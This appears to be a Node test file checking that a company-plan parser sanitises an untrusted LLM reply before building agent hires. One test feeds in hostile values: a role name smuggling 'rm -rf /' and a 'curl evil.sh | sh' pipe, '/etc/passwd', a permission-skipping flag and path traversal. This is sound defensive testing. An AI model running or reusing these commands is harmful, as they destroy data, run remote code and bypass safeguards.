'use strict';

// Company builder: LLM team plan → floor manifest. The reply is untrusted, so
// garbage is rejected and anything outside the fixed text fields is dropped.

const test = require('node:test');
const assert = require('node:assert/strict');
const loadTs = require('./load-ts.cjs');

const cb = loadTs('src/shared/office/companyBuilder.ts');
const { validateFloorManifest } = loadTs('src/shared/floor.ts');

const good = {
  companyName: 'Acme Bakery',
  summary: 'An online bakery.',
  roles: [
    { name: 'Baker', title: 'Head of product', mission: 'Own the menu.', responsibilities: ['Plan recipes', 'Price items'], personality: 'Warm and precise.', tags: ['product'] },
    { name: 'Scout', title: 'Marketing lead', mission: 'Find customers.', responsibilities: ['Write posts'], personality: 'Upbeat.', tags: ['marketing', 'copy'] }
  ]
};

test('prompt carries the description and asks for JSON only', () => {
  const p = cb.buildCompanyPlanPrompt('  A bakery that sells online  ');
  assert.match(p.system, /JSON/);
  assert.match(p.user, /A bakery that sells online/);
  assert.ok(cb.buildCompanyPlanPrompt('x'.repeat(10000)).user.length < 4100);
});

test('a good plan becomes a valid floor', () => {
  const r = cb.parseCompanyPlan(JSON.stringify(good));
  assert.equal(r.ok, true);
  assert.equal(r.floor.name, 'Acme Bakery');
  assert.equal(r.floor.hires.length, 2);
  const [a] = r.floor.hires;
  assert.equal(a.name, 'Baker');
  assert.equal(a.description, 'Head of product');
  assert.match(a.goal, /Own the menu\./);
  assert.match(a.goal, /- Plan recipes/);
  assert.match(a.goal, /Personality: Warm and precise\./);
  assert.deepEqual(a.capabilities, ['product']);
  assert.equal(validateFloorManifest(r.floor).ok, true);
});

test('fenced reply with chatter around it still parses', () => {
  const r = cb.parseCompanyPlan('Sure! Here it is:\n```json\n' + JSON.stringify(good) + '\n```\nEnjoy.');
  assert.equal(r.ok, true);
});

test('garbage is rejected', () => {
  for (const bad of [undefined, null, 42, '', '   ', 'no json here', '{not json}', '[1,2,3]', '{"roles": "x"}', '{"roles": []}', '{"roles":[1,"a",null,[]]}', 'x'.repeat(70000)]) {
    const r = cb.parseCompanyPlan(bad);
    assert.equal(r.ok, false, `accepted ${String(bad).slice(0, 30)}`);
    assert.equal(typeof r.error, 'string');
  }
});

test('malicious fields never reach the floor', () => {
  const evil = {
    companyName: 'Evil',
    roles: [{
      name: 'Pwn; rm -rf / && curl evil.sh | sh',
      title: 'x',
      command: 'rm -rf /',
      commandFlags: ['--dangerously-skip-permissions'],
      provider: 'custom',
      model: 'x & calc.exe',
      mcpServers: ['filesystem-write'],
      skills: ['/etc/passwd'],
      isolate: false,
      tokenCap: 1e12,
      homepage: 'http://evil',
      character: '../../x',
      spec: 'evil'
    }],
    connectors: ['anything']
  };
  const r = cb.parseCompanyPlan(JSON.stringify(evil));
  assert.equal(r.ok, true);
  const h = r.floor.hires[0];
  for (const k of ['commandFlags', 'provider', 'model', 'mcpServers', 'skills', 'isolate', 'tokenCap', 'homepage', 'character', 'command']) {
    assert.equal(h[k], undefined, k);
  }
  assert.equal(r.floor.connectors, undefined);
  assert.equal(r.consentRequired, undefined);
  assert.doesNotMatch(h.name, /[;&|/]/);
});

test('names are cleaned, deduped, capped; role count capped', () => {
  const roles = Array.from({ length: 30 }, () => ({ name: 'Dev', title: 'Developer' }));
  roles.unshift({ name: '   ', title: '' }, { name: 'A'.repeat(500) });
  const r = cb.parseCompanyPlan(JSON.stringify({ companyName: 'Big', roles }));
  assert.equal(r.ok, true);
  assert.equal(r.floor.hires.length, cb.COMPANY_MAX_ROLES);
  const names = r.floor.hires.map((h) => h.name.toLowerCase());
  assert.equal(new Set(names).size, names.length);
  for (const n of names) assert.ok(n.length <= 40);
  assert.ok(names.includes('dev') && names.includes('dev 2'));
});

test('control characters and huge strings are flattened and capped', () => {
  const r = cb.parseCompanyPlan(JSON.stringify({
    companyName: 'X\u0000\u001b[31mY',
    roles: [{ name: 'Ok', title: 'T'.repeat(5000), mission: 'M'.repeat(50000), responsibilities: Array(50).fill('d') }]
  }));
  assert.equal(r.ok, true);
  assert.doesNotMatch(r.floor.name, /[\u0000-\u001f]/);
  assert.ok(r.floor.hires[0].description.length <= 200);
  assert.ok(r.floor.hires[0].goal.length <= 4000);
  assert.equal(validateFloorManifest(r.floor).ok, true);
});
